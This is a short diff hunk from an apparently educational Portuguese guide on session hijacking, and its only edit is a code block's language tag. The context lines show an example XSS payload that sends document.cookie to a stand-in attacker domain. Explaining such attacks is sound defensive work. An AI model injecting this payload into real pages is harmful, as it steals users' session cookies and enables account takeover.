@@ -73,7 +73,7 @@ O que é possível é evitar que pessoas mal intencionadas obtenham sua sessão 
 
 #### Exemplo de Session Hijacking por meio de XSS
 
-```htmlmixed
+```html
 <script type="text/javascript">
 new Image().src="http://www.sitedoatacante.com.br/cookies.php?c="+encodeURI(document.cookie);
 </script>
